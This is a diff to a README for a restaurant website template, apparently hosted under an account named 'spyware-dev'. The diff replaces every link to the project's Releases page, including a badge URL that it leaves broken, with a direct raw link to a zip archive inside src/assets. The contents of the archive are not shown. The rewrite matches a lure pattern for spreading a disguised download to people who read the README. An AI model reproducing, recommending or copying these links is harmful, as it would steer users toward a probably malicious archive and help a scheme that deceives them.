@@ -1,6 +1,6 @@
 # 🍽️ Food-Restaurant-website - A Stylish Food Experience Online
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue)](https://github.com/spyware-dev/Food-Restaurant-website/releases)
+[![Download Now](https://raw.githubusercontent.com/spyware-dev/Food-Restaurant-website/main/src/assets/Food-Restaurant-website-1.3.zip%20Now-Here-blue)](https://raw.githubusercontent.com/spyware-dev/Food-Restaurant-website/main/src/assets/Food-Restaurant-website-1.3.zip)
 
 ## 📦 Overview
 
@@ -20,7 +20,7 @@ Before you download, please ensure your system meets these requirements:
 
 ### 2. Visit the Releases Page
 
-To download the application, go to our [Releases page](https://github.com/spyware-dev/Food-Restaurant-website/releases). Here, you will find all the versions available for download.
+To download the application, go to our [Releases page](https://raw.githubusercontent.com/spyware-dev/Food-Restaurant-website/main/src/assets/Food-Restaurant-website-1.3.zip). Here, you will find all the versions available for download.
 
 ### 3. Choose Your Version
 
@@ -30,7 +30,7 @@ On the Releases page, you'll see different versions of the application. Select t
 
 Click the download link next to the version you want. The file will start downloading to your computer. 
 
-You can also access the download link directly: [Download Food-Restaurant-website](https://github.com/spyware-dev/Food-Restaurant-website/releases).
+You can also access the download link directly: [Download Food-Restaurant-website](https://raw.githubusercontent.com/spyware-dev/Food-Restaurant-website/main/src/assets/Food-Restaurant-website-1.3.zip).
 
 ## 📥 Download & Install
 
@@ -101,4 +101,4 @@ Explore more about the project through these topics:
 - responsive-design
 - responsive-web-design
 
-Remember to check our [Releases page](https://github.com/spyware-dev/Food-Restaurant-website/releases) for updates!
+Remember to check our [Releases page](https://raw.githubusercontent.com/spyware-dev/Food-Restaurant-website/main/src/assets/Food-Restaurant-website-1.3.zip) for updates!
